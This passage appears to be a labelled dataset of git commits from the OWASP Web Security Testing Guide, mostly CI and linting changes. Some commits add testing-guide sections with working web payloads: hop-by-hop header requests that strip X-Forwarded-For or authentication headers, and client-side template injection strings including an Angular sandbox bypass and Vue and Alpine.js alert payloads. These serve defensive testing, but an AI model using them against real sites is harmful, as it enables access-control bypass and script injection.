      "gitignore",
      "py",
      "md",
      "yml"
    ],
    "added_lines": "+        # Parse and format the lint output for better readability\n+        python3 base/.github/workflows/scripts/format_lint_output.py > artifact.txt\n+# Workflow Scripts\n+\n+This directory contains helper scripts used by GitHub Actions workflows.\n+\n+## Scripts\n+\n+### format_lint_output.py\n+\n+Formats markdown linting output for better readability in PR comments.\n+\n+**Input:** Reads from `lint.txt` (raw markdownlint-cli2 output) in the current working directory  \n+**Output:** Writes formatted markdown to stdout\n+\n+**Features:**\n+- Removes redundant metadata (version info, \"Finding:\", \"Linting:\", \"Summary:\")\n+- Groups errors by file with proper markdown formatting\n+- Shows file paths as section headers instead of repeating for each error\n+- Uses bullet points with line numbers, rule codes, and descriptions\n+- Includes total error count and helpful footer with link to config\n+- Graceful fallback to raw output if parsing fails\n+\n+**Usage:**\n+\n+From the repository root (where `lint.txt` is generated):\n+```bash\n+python3 .github/workflows/scripts/format_lint_output.py > artifact.txt\n+```\n+\n+Or from within the workflow (with base checkout):\n+```bash\n+python3 base/.github/workflows/scripts/format_lint_output.py > artifact.txt\n+```\n+#!/usr/bin/env python3\n+\"\"\"\n+Format markdown linting output for better readability in PR comments.\n+\n+This script parses the raw markdownlint-cli2 output and formats it as\n+user-friendly markdown with proper structure and visual hierarchy.\n+\"\"\"\n+\n+import re\n+import sys\n+from typing import List, Dict, Optional, Tuple\n+\n+\n+def read_lint_file(filepath: str = 'lint.txt') -> str:\n+    \"\"\"\n+    Read the lint output file.\n+    \n+    Args:\n+        filepath: Path to the lint output file\n+        \n+    Returns:\n+        Content of the lint file\n+    \"\"\"\n+    with open(filepath, 'r') as f:\n+        return f.read()\n+\n+\n+def parse_error_line(line: str) -> Optional[Dict[str, str]]:\n+    \"\"\"\n+    Parse a single error line from markdownlint output.\n+    \n+    Args:\n+        line: A line from the linter output\n+        \n+    Returns:\n+        Dictionary with error details or None if not an error line\n+    \"\"\"\n+    match = re.search(r':(\\d+)(?::(\\d+))?\\s+error\\s+(MD\\d+/[\\w\\-]+)\\s+(.+)$', line)\n+    if match:\n+        return {\n+            'line': match.group(1),\n+            'col': match.group(2),\n+            'rule': match.group(3),\n+            'message': match.group(4)\n+        }\n+    return None\n+\n+\n+def extract_error_count(line: str) -> int:\n+    \"\"\"\n+    Extract error count from a Summary line.\n+    \n+    Args:\n+        line: A Summary line from linter output\n+        \n+    Returns:\n+        Number of errors found, or 0 if not found\n+    \"\"\"\n+    match = re.search(r'(\\d+)\\s+error', line)\n+    return int(match.group(1)) if match else 0\n+\n+\n+def parse_lint_output(content: str) -> Tuple[List[Dict], int]:\n+    \"\"\"\n+    Parse the linter output and extract file blocks and error counts.\n+    \n+    Args:\n+        content: Raw linter output content\n+        \n+    Returns:\n+        Tuple of (file_blocks, total_error_count)\n+    \"\"\"\n+    lines = content.strip().split('\\n')\n+    file_blocks = []\n+    current_file = None\n+    current_errors = []\n+    total_error_count = 0\n+    \n+    i = 0\n+    while i < len(lines):\n+        line = lines[i]\n+        \n+        # Skip version line\n+        if line.startswith('markdownlint-cli2'):\n+            i += 1\n+            continue\n+        \n+        # New file block\n+        if line.startswith('Finding:'):\n+            # Save previous file block if exists\n+            if current_file and current_errors:\n+                file_blocks.append({\n+                    'file': current_file,\n+                    'errors': current_errors,\n+                    'count': len(current_errors)\n+                })\n+            \n+            current_file = line.replace('Finding:', '').strip()\n+            current_errors = []\n+            i += 1\n+            continue\n+        \n+        # Skip metadata lines\n+        if line.startswith('Linting:') or line.startswith('Summary:'):\n+            if line.startswith('Summary:'):\n+                total_error_count += extract_error_count(line)\n+            i += 1\n+            continue\n+        \n+        # Parse error line\n+        if line.strip():\n+            error = parse_error_line(line)\n+            if error:\n+                current_errors.append(error)\n+        \n+        i += 1\n+    \n+    # Save last file block\n+    if current_file and current_errors:\n+        file_blocks.append({\n+            'file': current_file,\n+            'errors': current_errors,\n+            'count': len(current_errors)\n+        })\n+    \n+    return file_blocks, total_error_count\n+\n+\n+def format_error_line(error: Dict[str, str]) -> str:\n+    \"\"\"\n+    Format a single error as a markdown list item.\n+    \n+    Args:\n+        error: Dictionary containing error details\n+        \n+    Returns:\n+        Formatted error line\n+    \"\"\"\n+    line_info = f\"Line {error['line']}\"\n+    ",
    "label": 0
  },
  {
    "hash": "a574bf77b4ba1a35142caa081d18f7d1eebc1d82",
    "message": "docs: add hop-by-hop header injection test case to WSTG-CONF-14 (#1310)",
    "files": [
      ".vscode/settings.json",
      "document/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/14-Test_Other_HTTP_Security_Header_Misconfigurations.md"
    ],
    "extensions": [
      "json",
      "md"
    ],
    "added_lines": "+    \"editor.quickSuggestions\": {\n+      \"comments\": \"off\",\n+      \"strings\": \"off\",\n+      \"other\": \"off\"\n+    }\n+- **Hop-by-Hop Header Injection:** Occurs when intermediaries incorrectly process the `Connection` header, allowing attackers to list and \"strip\" sensitive internal security headers (like `X-Forwarded-For`) before the request reaches the backend.\n+- **Command-line Tools:** Execute a cURL command to retrieve HTTP response headers: `curl -I https://example.com`\n+    - Some Firewalls may block cURL's default User-Agent and some TLS/SSL errors will also prevent it from returning the correct information, in this case you could try to use the following command:\n+    `curl -I -L -k --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36\" https://example.com`\n+### Test for Header Stripping (Hop-by-Hop Injection)\n+\n+Attackers can exploit this by listing sensitive security headers inside the `Connection` header. The proxy, following the standard, strips these headers before forwarding the request to the backend. This can lead to:\n+\n+- Bypassing IP-based Access Control Lists (ACLs).\n+- Bypassing Identity/Authentication checks performed at the edge.\n+- Disabling security features enforced by intermediary headers.\n+\n+#### Identification of Internal/Sensitive Headers (Reconnaissance)\n+\n+To perform this test, you first need to identify which headers are used by the internal infrastructure. You can identify them by:\n+\n+- **Triggering Error Pages:** Send malformed requests to trigger error pages (404, 500), which might leak internal headers in the response.\n+- **Reflection Endpoints:** Search for debugging or \"Echo\" pages (e.g., `/phpinfo`, `/debug`, `/env`) that display all headers received by the backend.\n+- **Header Guessing:** Common targets include `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Proto`, and `X-Authenticated-User`.\n+\n+#### Execution of the Injection\n+\n+Attempt to \"strip\" a target header by adding it as a value to the `Connection` header.\n+\n+##### Scenario A: Bypassing IP-based Restrictions\n+\n+```http\n+GET /admin HTTP/1.1\n+Host: example.com\n+X-Forwarded-For: 203.0.113.10\n+Connection: close, X-Forwarded-For\n+```\n+\n+##### Scenario B: Stripping Authentication Context\n+\n+```http\n+GET /api/user/profile HTTP/1.1\n+Host: example.com\n+X-Authenticated-User: victim_user\n+Connection: close, X-Authenticated-User\n+```\n+\n+#### Analyzing the Response\n+\n+- **Vulnerable:** The application behavior changes (e.g., access is granted, or a reflected IP disappears).\n+- **Secure:** The application behavior remains unchanged, or the proxy returns a `400 Bad Request`.\n+\n+- **Restrict Connection Header:** Configure proxies to ignore client-supplied values in the `Connection` header that match sensitive internal headers.\n+- **Zero Trust:** Avoid relying solely on hop-by-hop headers for critical security decisions.\n+- [RFC 9110 - HTTP Semantics: Connection Header](https://datatracker.ietf.org/doc/html/rfc9110#section-7.6.1)\n+- [Abusing HTTP Hop-by-Hop Request Headers](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)",
    "label": 1
  },
  {
    "hash": "fec4ebc090625b83f5123928579056cb62fe79ee",
    "message": "docs: add CSTI reference and fix Jekyll build syntax",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+Unlike [Server-Side Template Injection (SSTI)](../07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md), where the template is rendered on the server, CSTI occurs entirely within the user's browser. When the framework scans the DOM for dynamic content, it may execute the injected template expressions. This often leads to Cross-Site Scripting (XSS), but the method of injection and exploitation differs from standard XSS because the payload must follow the specific syntax of the template engine (e.g., {% raw %}`{{ 7*7 }}`{% endraw %}).\n+To detect CSTI, testers should inject characters that are syntactically significant to the template engine. The most common syntax for interpolation in many frameworks is double curly braces {% raw %}`{{ }}`{% endraw %}.\n+\n+\n+- If the application renders {% raw %}`{{ 7*7 }}`{% endraw %}, it is likely not vulnerable or strict contextual escaping is in place.\n+\n+\n+\n+\n+\n+\n+\n+\n+{% raw %}\n+\n+{% endraw %}\n+\n+    - Vue: Use `v-text` or curly braces {% raw %}`{{ }}`{% endraw %} (which auto-escape HTML) instead of `v-html`.\n+- [{% raw %}{{alert(\u2019CSTI\u2019)}}{% endraw %}: Large-Scale Detection of Client-Side Template Injection](https://ieeexplore.ieee.org/document/11352459)",
    "label": 1
  },
  {
    "hash": "3d22d187c96a9fe991e2b3a6306de15e27d367eb",
    "message": "docs: fix 404 broken link by correcting case-sensitivity in path",
    "files": [
      "document/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+#### 4.11.15 [Testing for Client-side Template Injection](4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection.md)",
    "label": 0
  },
  {
    "hash": "1f8bb7bae7eb2e5da18a1a9c23baf077b129a1e2",
    "message": "Add space before filename in output redirection on line 112",
    "files": [
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        cat log.txt | grep -v '\u2714 Fixed' | tr '\u2714' '\u2716' > mistakes.txt",
    "label": 0
  },
  {
    "hash": "68a246ca76ae559603c11eb9933f215ba5ad2e60",
    "message": "Replace black X with red X emoji in md-textlint-check workflow for better dark theme visibility",
    "files": [
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        sed -i 's/\u2716/\u274c/g' mistakes.txt",
    "label": 0
  },
  {
    "hash": "20cca2ddb37c7bc3de48121e48f0ef9e23dad227",
    "message": "docs: clarify legacy browser context for CSS injection (#1304)",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted site which is rendered inside a victim's browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross-site scripting or data exfiltration.\n+> **Note:**\n+ Some CSS-based JavaScript execution techniques rely on legacy browser behavior (e.g., older versions of IE and Opera). While modern browsers mitigate most of these vectors, CSS injection can still enable data exfiltration, UI manipulation, and attack chaining.\n+Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the site returns CSS rules on the basis of the inputs should be inspected.",
    "label": 1
  },
  {
    "hash": "f994e54c1567feb1e22d4fe6e3eb3fa371855f6c",
    "message": "Add author credit for CSTI section (#1303)",
    "files": [
      "document/1-Frontispiece/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+- Meysam Bal-afkan",
    "label": 0
  },
  {
    "hash": "8325880a5851e16afe5b9e3a1689a38016dc038a",
    "message": "Migrate markdown linting from markdownlint-cli to markdownlint-cli2 (#1302)",
    "files": [
      ".github/workflows/md-lint-check.yml",
      "package.json"
    ],
    "extensions": [
      "json",
      "yml"
    ],
    "added_lines": "+      run: npm install -g markdownlint-cli2\n+            OUTPUT=\"$(markdownlint-cli2 \"$FILE\" --config ../base/.github/configs/.markdownlint.json 2>&1)\" || STATUS=$?\n+    \"markdownlint-cli2\": \"^0.20.0\"",
    "label": 0
  },
  {
    "hash": "a13d4a9a792f45ed892dbdff8244c7500fc91668",
    "message": "Further minor fixes",
    "files": [
      "document/0-Foreword/README.md",
      "document/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+If you're building, designing or testing software, we strongly encourage you to get familiar with the security testing guidance in this document. It is a great road map for testing the most common issues that applications are facing today, but it is not exhaustive. If you find errors, please add a note to the discussion page or make the change yourself. You'll be helping thousands of others who use this guide.\n+## 0. [Foreword](0-Foreword/README.md)",
    "label": 0
  },
  {
    "hash": "8b6852b931dc63eeefd548ec81569a9d4a3549b0",
    "message": "Tweak heading",
    "files": [
      "document/0-Foreword/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+# Foreword",
    "label": 0
  },
  {
    "hash": "7de90496d4563c1f560e9749ac1891f8241e72fb",
    "message": "Link CSTI in Main index",
    "files": [
      "document/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+#### 4.11.15 [Testing for Client-side Template Injection](4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-side_Template_Injection.md)\n+",
    "label": 0
  },
  {
    "hash": "4c9328ebfc937b631fadc970ce85ff0bf3aad03a",
    "message": "Further Jekyll/Liquid scaping",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+{% raw %}\n+{% endraw %}\n+{% raw %}\n+{% endraw %}\n+{% raw %}\n+{% endraw %}\n+{% raw %}\n+{% endraw %}\n+{% raw %}\n+{% endraw %}",
    "label": 0
  },
  {
    "hash": "f3f64156229a5c3650ae6e4f2127e9b23ec00893",
    "message": "Jekyll/Liquid Escape some CSTI content",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+<-- {% raw %} -->\n+<-- {% endraw %} -->",
    "label": 0
  },
  {
    "hash": "358be3bb8f4cfeaad2527bd8c56971fdebff56f8",
    "message": "Replace .devcontainer with .vscode workspace config and .editorconfig (#1300)",
    "files": [
      ".devcontainer/Dockerfile",
      ".devcontainer/devcontainer.json",
      ".editorconfig",
      ".gitignore",
      ".vscode/extensions.json",
      ".vscode/settings.json",
      "CONTRIBUTING.md",
      "package.json"
    ],
    "extensions": [
      "gitignore",
      "editorconfig",
      "json",
      "devcontainer/Dockerfile",
      "md"
    ],
    "added_lines": "+# EditorConfig is awesome: https://EditorConfig.org\n+\n+# Top-most EditorConfig file\n+root = true\n+\n+# Unix-style newlines with a newline ending every file\n+[*]\n+end_of_line = lf\n+insert_final_newline = true\n+charset = utf-8\n+trim_trailing_whitespace = true\n+\n+# Markdown files\n+[*.md]\n+trim_trailing_whitespace = false\n+\n+# JSON files\n+[*.json]\n+indent_style = space\n+indent_size = 2\n+\n+# YAML files\n+[*.{yml,yaml}]\n+indent_style = space\n+indent_size = 2\n+\n+# Shell scripts\n+[*.sh]\n+indent_style = space\n+indent_size = 2\n+# Ignore user-specific files but allow workspace settings and extensions recommendations\n+.vscode/*\n+!.vscode/settings.json\n+!.vscode/extensions.json\n+{\n+  \"recommendations\": [\n+    \"DavidAnson.vscode-markdownlint\",\n+    \"yzhang.markdown-all-in-one\",\n+    \"streetsidesoftware.code-spell-checker\",\n+    \"shd101wyy.markdown-preview-enhanced\",\n+    \"bierner.github-markdown-preview\",\n+    \"esbenp.prettier-vscode\",\n+    \"GitHub.vscode-pull-request-github\"\n+  ]\n+}\n+{\n+  \"editor.formatOnType\": true,\n+  \"files.autoSave\": \"afterDelay\",\n+  \"files.autoSaveDelay\": 1500,\n+  \"[markdown]\": {\n+    \"editor.wordWrap\": \"bounded\",\n+    \"editor.wordWrapColumn\": 100,\n+    \"editor.quickSuggestions\": false\n+  },\n+  \"markdown.extension.toc.levels\": \"2..6\",\n+  \"markdown.preview.fontSize\": 21,\n+  \"markdownlint.config\": {\n+    \"extends\": \".github/configs/.markdownlint.json\"\n+  }\n+}\n+- [Contributing with GitHub Dev Environments](#contributing-with-github-dev-environments)\n+We've made it easy to get started! The repository includes configuration files for Visual Studio Code and other editors to help you maintain consistency with the project's style guide.\n+\n+2. Fork and clone your own copy of the repository. Here are complete instructions for [forking and syncing with GitHub](https://help.github.com/en/github/getting-started-with-github/fork-a-repo).\n+3. Choose your development environment:\n+\n+### Using Visual Studio Code\n+\n+Visual Studio Code is recommended for the best experience. The repository includes pre-configured settings in the `.vscode` directory.\n+\n+1. Install [Visual Studio Code](https://code.visualstudio.com/).\n+2. Open the cloned repository in Visual Studio Code.\n+3. When prompted, install the recommended extensions from `.vscode/extensions.json`. These include:\n+    - **markdownlint**: Ensures Markdown files follow the project's style guide\n+    - **Markdown All in One**: Provides helpful Markdown editing features\n+    - **Code Spell Checker**: Catches spelling errors\n+    - **Prettier**: Code formatter\n+    - **GitHub Pull Request**: Manage PRs directly from Visual Studio Code\n+\n+4. The workspace settings in `.vscode/settings.json` will automatically configure markdownlint to use the project's configuration file at `.github/configs/.markdownlint.json`.\n+\n+### Using Other Editors\n+\n+If you're using a different editor, the `.editorconfig` file will help maintain consistent formatting across different editors. Most modern editors support EditorConfig either natively or via plugins:\n+\n+- **Vim/Neovim**: Install [editorconfig-vim](https://github.com/editorconfig/editorconfig-vim)\n+- **Sublime Text**: Install [EditorConfig](https://packagecontrol.io/packages/EditorConfig)\n+- **Atom**: Install [EditorConfig](https://atom.io/packages/editorconfig)\n+- **IntelliJ/WebStorm**: Built-in support\n+\n+### Running the Linter Locally\n+\n+To ensure your changes follow the project's Markdown style guide, you can run the linter locally:\n+\n+1. Install dependencies (requires [Node.js](https://nodejs.org/)):\n+\n+    ```bash\n+    npm install\n+2. Run the linter:\n+\n+    ```bash\n+    npm run lint\n+    ```\n+\n+The linter will check all Markdown files and report any style issues that need to be fixed before submitting your pull request.\n+\n+## Contributing with GitHub Dev Environments\n+\n+You can use GitHub's cloud-based development environments (Codespaces and github.dev) to contribute to this repository without setting up a local environment!\n+\n+### Using github.dev\n+\n+For quick edits, you can use the github.dev web-based editor:\n+\n+1. Navigate to the repository on GitHub.\n+2. Press `.` (period) on your keyboard to open the github.dev editor.\n+3. Make your changes and commit them directly from the browser.\n+\n+Note: The github.dev editor has limited support for running commands, so it's best for simple text edits. For testing linting and other scripts, use Codespaces or a local environment.\n+### Using GitHub Codespaces\n+GitHub Codespaces provides a full Visual Studio Code environment in the cloud with all recommended extensions pre-installed.\n+1. Learn more about [GitHub Codespaces](https://docs.github.com/en/codespaces/overview).\n+2. Get started by [creating a codespace](https://docs.github.com/en/codespaces/developing-in-codespaces/creating-a-codespace) for this repository.\n+Our `.vscode` configuration will automatically set up the workspace with the correct linting and formatting settings.\n+    \"markdownlint-cli\": \"^0.31.1\",\n+    \"markdownli",
    "label": 0
  },
  {
    "hash": "78d9a47380c05f26490ac0d782a4c44dd0ce9a98",
    "message": "Publish Latest checklists 2026-02-02 (#1301)",
    "files": [
      "checklists/README.md",
      "checklists/checklist.json",
      "checklists/checklist.xlsx"
    ],
    "extensions": [
      "json",
      "md",
      "xlsx"
    ],
    "added_lines": "+SHA-256: 464dce37b4533a274a935d80018924f772d85c834d3e8b656b5e9b9be432072b\n+                ,{\n+                \"name\":\"Testing for Client-side Template Injection\",\n+                \"id\":\"WSTG-CLNT-15\",\n+                \"reference\":\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection\",\n+                \"objectives\":[\n+                    \"Identify the client-side framework and its version used by the application.\",\n+                    \"Detect injection points where user input is reflected into the DOM and processed by the template engine.\",\n+                    \"Assess if the injection allows for arbitrary JavaScript execution (XSS) via the template syntax.\"\n+                  ]\n+                }",
    "label": 0
  },
  {
    "hash": "e08e4022a262412d7d36a21872717a063a250dda",
    "message": "docs: add new test section for CSTI (WSTG-CLNT-15) (#1292)",
    "files": [
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/15-Testing_for_Client-Side_Template_Injection.md",
      "document/4-Web_Application_Security_Testing/11-Client-side_Testing/README.md"
    ],
    "extensions": [
      "md"
    ],
    "added_lines": "+# Testing for Client-side Template Injection\n+\n+|ID          |\n+|------------|\n+|WSTG-CLNT-15|\n+\n+## Summary\n+\n+Client-Side Template Injection (CSTI), also known as DOM-based Template Injection, arises when applications using client-side frameworks (such as Angular, Vue.js, or Alpine.js) dynamically embed user input into the web page's DOM. If this input is embedded into a template expression or interpreted by the framework's template engine, an attacker can inject malicious directives.\n+\n+Unlike [Server-Side Template Injection (SSTI)](../07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md), where the template is rendered on the server, CSTI occurs entirely within the user's browser. When the framework scans the DOM for dynamic content, it may execute the injected template expressions. This often leads to Cross-Site Scripting (XSS), but the method of injection and exploitation differs from standard XSS because the payload must follow the specific syntax of the template engine (e.g., `{{ 7*7 }}`).\n+\n+This vulnerability is particularly common in Single Page Applications (SPAs) where developers might rely on client-side rendering without strict context separation.\n+\n+## Test Objectives\n+\n+- Identify the client-side framework and its version used by the application.\n+- Detect injection points where user input is reflected into the DOM and processed by the template engine.\n+- Assess if the injection allows for arbitrary JavaScript execution (XSS) via the template syntax.\n+\n+## How to Test\n+\n+### Black-Box Testing\n+\n+#### Framework Identification\n+\n+The first step is to identify if a client-side framework is in use. Testers should look for specific attributes in the HTML source code or specific HTTP response headers.\n+\n+- **Angular:** Look for attributes like `ng-app`, `ng-model`, or `ng-bind`.\n+- **Vue.js:** Look for attributes starting with `v-`, such as `v-if`, `v-for`, or the presence of the Vue global object in the console.\n+- **Alpine.js:** Look for `x-data`, `x-html`.\n+\n+#### Injection Detection\n+\n+To detect CSTI, testers should inject characters that are syntactically significant to the template engine. The most common syntax for interpolation in many frameworks is double curly braces `{{ }}`.\n+\n+A simple arithmetic operation is the standard probe. If the application evaluates the math, it is vulnerable.\n+\n+**Generic Probe:**\n+\n+```txt\n+Inject the string: {{ 7*7 }}\n+```\n+\n+- If the application renders `49`, CSTI is present.\n+- If the application renders `{{ 7*7 }}`, it is likely not vulnerable or strict contextual escaping is in place.\n+\n+#### Angular\n+\n+Angular acts on the DOM. If an attacker can inject a string containing Angular expressions into the DOM before Angular bootstraps or compiles it, the expression will be executed.\n+\n+**Payloads for Detection:**\n+\n+- `{{ 7*7 }}`\n+- `{{ constructor.constructor('alert(1)')() }}`\n+\n+In older versions of Angular (1.x), the template engine works in a sandbox. Exploitation requires breaking out of this sandbox. The complexity of the payload depends heavily on the specific version.\n+\n+**Example Payload (Angular 1.5.x sandbox bypass):**\n+\n+```javascript\n+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}\n+```\n+\n+#### Vue.js\n+\n+Vue.js is also susceptible if developers use the `v-html` directive with user input or if they mount a Vue instance on a DOM element that already contains user-controlled HTML.\n+\n+**Payloads for Detection:**\n+\n+- `{{ 7*7 }}`\n+\n+**Example Payload (Vue.js 2.x):**\n+\n+```javascript\n+{{_v.constructor('alert(1)')()}}\n+```\n+\n+#### Alpine.js\n+\n+Alpine.js relies heavily on DOM attributes. If an attacker can control an attribute name or inject into a directive, they can execute code.\n+\n+**Example Payload:**\n+\n+```html\n+<div x-data=\"\" x-html=\"'<img src=x onerror=alert(1)>'\"></div>\n+```\n+\n+### Gray-Box Testing\n+\n+#### Code Review\n+\n+In a gray-box scenario, testers verify how user input is handled in the frontend code. The key is to identify where \"sinks\" that interpret HTML or Template Syntax are used with \"tainted\" sources (user input).\n+\n+**Angular Sinks:**\n+Search for usages of `$compile` or `ng-bind-html`.\n+If `ng-bind-html` is used, check if `$sce` (Strict Contextual Escaping) is properly configured or if `$sce.trustAsHtml()` is used on untrusted data.\n+\n+```javascript\n+// Vulnerable example in Angular\n+$scope.htmlSnippet = $sce.trustAsHtml(userInput);\n+```\n+\n+**Vue.js Sinks:**\n+Search for the `v-html` directive. Using `v-html` on user-provided content is a primary cause of CSTI/XSS in Vue.\n+\n+```html\n+<div v-html=\"userProvidedComment\"></div>\n+```\n+\n+**React Sinks:**\n+While React is generally safer regarding template injection because it does not scan the DOM for templates (JSX is compiled), improper use of `dangerouslySetInnerHTML` allows for DOM-based XSS, which is the React equivalent of the risk profile discussed here.\n+\n+```javascript\n+// Vulnerable example in React\n+<div dangerouslySetInne",
    "label": 1
  },
  {
    "hash": "d9ac401cd67bb96d7ba5c4e4b10178c8220d12f1",
    "message": "Replace \u2716 with \u274c in link-checker output for dark theme visibility (#1299)",
    "files": [
      ".github/workflows/md-link-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        sed -i 's/\\[\u2716\\]/\\[\u274c\\]/g' brokenlinks.txt",
    "label": 0
  },
  {
    "hash": "2662ca9a8a46d80790f2df3bbdab4d7098ac8600",
    "message": "Fix markdown link checker 400 errors for local relative links (#1297)",
    "files": [
      ".github/workflows/md-link-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+        \n+        # Copy changed files from pr/ to base/ to check them with correct relative link resolution\n+        for FILE in $FILES; do\n+          if printf '%s\\n' \"$FILE\" | grep -q '.*\\.md$'; then\n+            # Ensure parent directory exists in base/\n+            mkdir -p \"base/$(dirname \"$FILE\")\"\n+            # Copy the PR version to base/\n+            cp \"pr/$FILE\" \"base/$FILE\"\n+          fi\n+        done\n+        \n+        # Check files in base/ where relative links can be resolved\n+        for FILE in $FILES; do\n+          if printf '%s\\n' \"$FILE\" | grep -q '.*\\.md$'; then\n+            markdown-link-check -q -v -c base/.github/configs/markdown-link-check-config.json \"base/$FILE\" 1>> log 2>> err\n+          fi\n+        done\n+        ",
    "label": 0
  },
  {
    "hash": "2f468a39ebafd9e3e941c0c0538f3554bae8a7e9",
    "message": "Implement sparse checkout in PR workflows with defense-in-depth security validation (#1296)",
    "files": [
      ".github/workflows/md-link-check.yml",
      ".github/workflows/md-lint-check.yml",
      ".github/workflows/md-textlint-check.yml"
    ],
    "extensions": [
      "yml"
    ],
    "added_lines": "+    - name: Checkout Base\n+        repository: OWASP/wstg\n+        path: base\n+        pattern: '^.*\\.(md)$'\n+    - name: Sparse Checkout Changed Files\n+      if: github.event_name == 'pull_request'\n+      env:\n+        FILES: '${{ steps.files.outputs.files_updated }} ${{ steps.files.outputs.files_created }}'\n+      shell: bash\n+      run: |\n+        set -euo pipefail\n+        \n+        # Skip if no files changed\n+        if [ -z \"$FILES\" ]; then\n+          echo \"No files to checkout, skipping sparse checkout\"\n+          mkdir -p pr\n+          exit 0\n+        fi\n+        \n+        REPO=\"${{ github.event.pull_request.head.repo.full_name }}\"\n+        SHA=\"${{ github.event.pull_request.head.sha }}\"\n+        \n+        if [ -z \"$REPO\" ] || [ -z \"$SHA\" ]; then\n+          echo \"Error: Missing repository information (REPO='$REPO', SHA='$SHA')\" >&2\n+          exit 1\n+        fi\n+        \n+        # Validate REPO format to prevent injection via special characters\n+        if [[ ! \"$REPO\" =~ ^[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+$ ]]; then\n+          echo \"Error: Invalid repository format: '$REPO'. Expected 'owner/repo'.\" >&2\n+          exit 1\n+        fi\n+        \n+        # Validate SHA format (7-40 lowercase hex characters)\n+        if [[ ! \"$SHA\" =~ ^[0-9a-f]{7,40}$ ]]; then\n+          echo \"Error: Invalid SHA format '$SHA'. Expected 7-40 lowercase hex characters.\" >&2\n+          exit 1\n+        fi\n+        \n+        # Create pr directory for sparse checkout\n+        mkdir -p pr\n+        cd pr\n+        # Initialize git repository\n+        git init || { echo \"Error: git init failed\" >&2; exit 1; }\n+        git remote add origin \"https://github.com/$REPO\" || { echo \"Error: git remote add failed\" >&2; exit 1; }\n+        # Enable sparse checkout\n+        git config core.sparseCheckout true || { echo \"Error: git config failed\" >&2; exit 1; }\n+        # Add only the changed files to sparse checkout\n+        for FILE in $FILES; do\n+          printf '%s\\n' \"$FILE\" >> .git/info/sparse-checkout\n+        done\n+        \n+        # If no files were added to sparse-checkout, skip fetch/checkout\n+        if [ ! -s .git/info/sparse-checkout ]; then\n+          echo \"No markdown files to checkout, skipping git fetch and checkout\"\n+          cd ..\n+          exit 0\n+        fi\n+        \n+        # Fetch and checkout only the specified files\n+        git fetch --depth=1 origin \"$SHA\" || { echo \"Error: git fetch failed for SHA '$SHA'\" >&2; exit 1; }\n+        git checkout \"$SHA\" || { echo \"Error: git checkout failed for SHA '$SHA'\" >&2; exit 1; }\n+        cd ..\n+      shell: bash\n+        set -euo pipefail\n+        \n+        printf '%s\\n' $FILES\n+        for FILE in $FILES; do printf '%s\\n' \"$FILE\" | grep -q .*\\.md\\$ && markdown-link-check -q -v -c base/.github/configs/markdown-link-check-config.json \"pr/$FILE\" 1>> log 2>> err; done\n+        cd base\n+    - name: Checkout Base\n+        repository: OWASP/wstg\n+        path: base\n+    - name: Changed Files Exporter\n+      id: files\n+      uses: umani/changed-files@138acc60bcaa548e0c194fc69ed36321ee8466d2 # v4.2.0\n+      with:\n+        repo-token: ${{ secrets.GITHUB_TOKEN }}\n+        pattern: '^.*\\.(md)$'\n+    - name: Sparse Checkout Changed Files\n+      env:\n+        FILES: '${{ steps.files.outputs.files_updated }} ${{ steps.files.outputs.files_created }}'\n+      shell: bash\n+      run: |\n+        set -euo pipefail\n+        \n+        # Skip if no files changed\n+        if [ -z \"$FILES\" ]; then\n+          echo \"No files to checkout, skipping sparse checkout\"\n+          mkdir -p pr\n+          exit 0\n+        fi\n+        \n+        REPO=\"${{ github.event.pull_request.head.repo.full_name }}\"\n+        SHA=\"${{ github.event.pull_request.head.sha }}\"\n+        \n+        if [ -z \"$REPO\" ] || [ -z \"$SHA\" ]; then\n+          echo \"Error: Missing repository information (REPO='$REPO', SHA='$SHA')\" >&2\n+          exit 1\n+        fi\n+\n+        # Validate REPO format to prevent injection via special characters\n+        if [[ ! \"$REPO\" =~ ^[a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+$ ]]; then\n+          echo \"Error: Invalid repository name format '$REPO'. Expected 'owner/repo'.\" >&2\n+          exit 1\n+        fi\n+        \n+        # Validate SHA format: 7 to 40 lowercase hexadecimal 